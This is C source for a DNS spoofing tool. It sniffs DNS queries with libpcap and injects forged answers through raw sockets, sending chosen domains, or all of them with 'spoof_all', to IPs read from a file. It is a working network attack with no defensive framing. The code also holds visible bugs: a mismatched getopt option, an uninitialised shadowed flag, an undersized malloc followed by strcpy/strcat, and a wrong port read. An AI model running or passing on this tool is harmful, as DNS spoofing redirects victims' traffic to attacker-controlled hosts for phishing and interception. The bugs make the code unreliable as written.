#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<ctype.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap.h>
#include<net/if.h>
#include<unistd.h>
#include<sys/ioctl.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<resolv.h>
struct ethernet_header{
        u_char  ether_dhost[6];  
        u_char  ether_shost[6];   
        u_short ether_type;                   
};


struct dns_header{
char id[2];
char flags[2];
char qdcount[2];
char ancount[2];
char nscount[2];
char arcount[2];
};

/*struct sniff_ip {
        u_char  ip_vhl;                 
        u_char  ip_tos;                 
        u_short ip_len;                 
        u_short ip_id;                  
        u_short ip_off;                 
     #define IP_RF 0x8000            
        #define IP_DF 0x4000            
        #define IP_MF 0x2000           
        #define IP_OFFMASK 0x1fff       
        u_char  ip_ttl;                 
        u_char  ip_p;                   
        u_short ip_sum;                
        unsigned int ip_src,ip_dst;  
};
*/
struct dns_question {
        char *qname;
        char qtype[2];
        char qclass[2];
};


/* Link linf for file options */
struct info {
        char sip[32];
        char domain[150];
        struct info *next;
};

int flag=0;
int flag1=0;
int flag2=0;


void getip(char *name,char *iip)
{
	
	struct ifreq fr;
	memcpy(fr.ifr_name,name,strlen(name));
	int fd=socket(AF_INET,SOCK_DGRAM,0);
	ioctl(fd,SIOCGIFADDR,&fr);
	close(fd);
	struct sockaddr_in *ip=(struct sockaddr_in*)&fr.ifr_addr;
	memcpy(iip,inet_ntoa(ip->sin_addr),32);
}

unsigned short getcrc(unsigned short *data,int len)
{
	long sum=0;
	while(len>1)
	{
		sum=sum+*data++;
		if(sum &0x80000000)
			sum =(sum &0xFFFF) + (sum >>16);
		len -=2;

	}

	if(len)
		sum +=(unsigned short)*(unsigned char *)data;


	while(sum >>16)
		sum=(sum & 0xFFFF) + (sum >>16);

	return ~sum;


}


void sendl(char *p,uint16_t port,char *packet,int len)
{
	struct sockaddr_in sadd;
	int bs,sock;
	sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
	if(sock<0){
	perror("couldnot create socket");
	}
	sadd.sin_family=AF_INET;
	sadd.sin_port=htons(port);
	sadd.sin_addr.s_addr=inet_addr(p);
	int pt=1;
	if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&pt,sizeof(pt))<0)
	{
		perror("couldnot set socket port");
	}
	sendto(sock,packet,len,0,(struct sockaddr *)&sadd,sizeof(sadd));

}

void spoof(struct info *args,const struct pcap_pkthdr *header,const u_char *packet)
{
	struct ethernet_header *ether;
        struct iphdr *ip;
        struct udphdr *udp, *reply_udp_hdr;
        struct ip *reply_ip_hdr;
        struct dns_question question, *dns_question_in;
        struct dns_header *dns_hdr;
        char src_ip[16], dst_ip[16];
        unsigned int ip_header_size;
        u_int16_t port;
        char request[150], *domain_name;
        char reply_packet[8192];
        int size, i = 1, j = 0, k;
        unsigned int reply_packet_size;
        char spoof_ip[32], *reply;
        unsigned char split_ip[4];
        struct in_addr dest, src;
        int spoof_it = 0;
        struct info *current;

        memset(reply_packet, 0, 8192);

        /* define ethernet header */
        ether = (struct ethernet_header*)(packet);
        ip = (struct iphdr*)(((char*) ether) + sizeof(struct ethernet_header));

        /* get cleaned up IPs */
        src.s_addr = ip->saddr;
        dest.s_addr = ip->daddr;
	        sprintf(src_ip, "%s", inet_ntoa(src));
        sprintf(dst_ip, "%s", inet_ntoa(dest));

        /* udp header */
        ip_header_size = ip->ihl * 4;
        udp = (struct udphdr*)(((char*) ip) + ip_header_size);

        /* dns header */
        dns_hdr = (struct dns_header*)(((char*) udp) + sizeof(struct udphdr));
        question.qname = ((char*) dns_hdr) + sizeof(struct dns_header);

        /*
         * parse domain name
         * [3]www[7]example[3]com -> www.example.com
         */
        domain_name = question.qname;
        size = domain_name[0];
        while (size > 0) {
                for (k = 0; k < size; k++) {
	                        request[j++] = domain_name[i + k];
                }

  request[j++] = '.';
                i += size;
                size = domain_name[i++];
        }
        request[--j] = '\0';

        /* get spoof IP */
        if (!strcmp(args->domain, "spoof_all")) {
                spoof_it = 1;
                memcpy(spoof_ip, args->sip, 32);
        } else {
                current = args;
                while (current != NULL) {
                        if (!strcmp(current->domain, request)) {
                                memcpy(spoof_ip, current->sip, 32);
                                spoof_it = 1;
                        }
                        current = current->next;
                }
        }

        if (spoof_it == 1) {
                /* reply is pointed to the beginning of dns header */
                reply = reply_packet + sizeof(struct ip) + sizeof(struct udphdr);

                /* reply dns_hdr */
                memcpy(&reply[0], dns_hdr->id, 2);
                memcpy(&reply[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);
		 dns_question_in = (struct dns_question*)(((char*) dns_hdr) + sizeof(struct dns_header));
                size = strlen(request) + 2;
                memcpy(&reply[12], dns_question_in, size);
                size += 12;
                memcpy(&reply[size], "\x00\x01\x00\x01", 4);
                size += 4;

                /* reply dns_answer */
                memcpy(&reply[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
                size += 12;
                sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&split_ip[0], (int *)&split_ip[1], (int *)&split_ip[2], (int *)&split_ip[3]);
                memcpy(&reply[size], split_ip, 4);
                size += 4;

                reply_packet_size = size;

                /* values from http://www.binarytides.com/raw-sockets-c-code-linux/ */
                reply_ip_hdr = (struct ip *) reply_packet;
                reply_udp_hdr = (struct udphdr *) (reply_packet + sizeof (struct ip));
                reply_ip_hdr->ip_hl = 5;
                reply_ip_hdr->ip_v = 4;
                reply_ip_hdr->ip_tos = 0;
                reply_ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + reply_packet_size;
                reply_ip_hdr->ip_id = 0;
                reply_ip_hdr->ip_off = 0;
		 reply_ip_hdr->ip_ttl = 255;
		                reply_ip_hdr->ip_p = 17;
                reply_ip_hdr->ip_sum = 0;
                reply_ip_hdr->ip_src.s_addr = inet_addr(dst_ip);
                reply_ip_hdr->ip_dst.s_addr = inet_addr(src_ip);

                reply_udp_hdr->source = htons(53);
                reply_udp_hdr->dest = udp->source;
                reply_udp_hdr->len = htons(sizeof(struct udphdr) + reply_packet_size);
                reply_udp_hdr->check = 0;

                reply_ip_hdr->ip_sum = getcrc((unsigned short *) reply_packet, reply_ip_hdr->ip_len >> 1);

                /* update the packet size with ip and udp header */
                reply_packet_size += (sizeof(struct ip) + sizeof(struct udphdr));

                /* sends our dns spoof response */
                sendl(src_ip, ntohs((*(u_int16_t*)&udp)), reply_packet, reply_packet_size);

                printf("Spoofed %s requested from %s\n", request, src_ip);
        } else {
                printf("Not Spoofing %s requested from %s as it's not listed in file.\n", request, src_ip);
        }
}



int main(int argc,char *argv[])
{
int opt;
pcap_t *handle;
char *dev;
char *dns="udp and dst port domain";
char *interface=NULL;
char *file;
struct info *head,*current;
size_t len=0;
char *token;
char *line=NULL;
char *filter;
struct bpf_program fp;
bpf_u_int32 mask;	
	bpf_u_int32 net;
int flag,flag1,flag2;
char errbuf[1024];
char sip[32];
int read;
	while((opt=getopt(argc,argv,"i:h:"))!=-1)
	{
	switch(opt)
	{
	case 'l':
	flag=1;
	interface=optarg;
	break;
	case 'h':
	file=optarg;
	flag1=1;
	break;
	}
	}

	if(optind<argc)
	{
		filter=argv[optind];
		flag2=1;
	}

if(flag==0)
{
	interface=pcap_lookupdev(errbuf);
	if(interface==NULL)
	{
		perror("interface is NULL");
		exit(0);
	}
}

if(flag!=0)
{
        if (flag1 == 1) {
                FILE *fptr = fopen(file, "r");
                if (fptr == 0) {
                        fprintf(stderr, "failed to open input.txt\n");
                        exit(EXIT_FAILURE);
                }

                head = current = NULL;
                while ((read = getline(&line, &len, fptr)) != -1) {
                        if (read <= 9) {
                                fprintf(stderr, "Malformed File.\n");
                                exit(0);
                        }
                        struct info *new_node = malloc(sizeof(struct info));
                        token = strtok(line, "\t\n");
                        memcpy(new_node->sip, token, 16);
                        new_node->sip[17] = '\0';
                        token = strtok(NULL, "\t\n");
                        memcpy(new_node->domain, token, strlen(token));
                        new_node->domain[strlen(token) + 1] = '\0';
                        new_node->next = NULL;
                        if (head == NULL) {
                                current = head = new_node;
                        } else {
                                current->next = new_node;
                                current = current->next;
                        }
			                }
                fclose(fptr);


}
else
{
	struct info *in =(struct info *)malloc(sizeof(struct info));
	getip(interface,sip);
	memcpy(in->sip,sip,16);
	memcpy(in->domain,"default",7);
	in->next=NULL;
	head=in;
}

	if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) {
		perror("Couldn't get netmask for device");
		net=0;
		mask=0;
	}

	handle = pcap_open_live(interface, 1518, 1, 1000, errbuf);
	if (handle == NULL) {
		perror("Couldn't open device");
		exit(0);
	}
	
char *exp;
if(flag2==1)
{
	int size=sizeof(dns)+sizeof(filter)+6;
	exp= malloc(sizeof(size));
	strcpy(exp,dns);
	strcat(exp," and ");
	strcat(exp,filter);
}
else
{
	int size=sizeof(dns);
	exp= malloc(sizeof(size));
	strcpy(exp,dns);
}


if (pcap_compile(handle, &fp,exp, 0, 0) == -1) {
		perror("Couldn't parse filter");
		exit(0);
	}


	if (pcap_setfilter(handle, &fp) == -1) {
		perror("Couldn't install filter");
		exit(0);
	}

	pcap_loop(handle, -1,(pcap_handler)spoof, (u_char *)head);
	pcap_freecode(&fp);
	pcap_close(handle);


}
}

